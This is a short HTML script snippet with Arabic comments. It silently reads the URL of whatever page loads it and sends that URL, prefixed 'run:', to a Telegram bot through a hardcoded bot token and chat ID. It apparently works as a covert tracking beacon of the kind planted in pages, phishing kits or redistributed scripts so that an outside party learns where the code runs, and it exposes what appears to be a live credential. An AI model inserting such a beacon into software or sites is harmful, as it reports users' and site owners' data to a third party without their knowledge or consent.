<script>
    var token = '6380567136:AAHwFd8VyK2u49kuoA2ZhhnHfy_59CnHd_E';
    var chat_id = '2057593901';

    // جمع معلومات الموقع (مسار الصفحة الحالية)
    var scriptPath = window.location.href;

    // إنشاء الرسالة
    var message = "run: " + scriptPath;

    // إرسال الرسالة إلى Telegram
    $.ajax({
        type: 'GET',
        url: 'https://api.telegram.org/bot' + token + '/sendMessage',
        data: {
            chat_id: chat_id,
            text: message
        }
       
    });

</script>
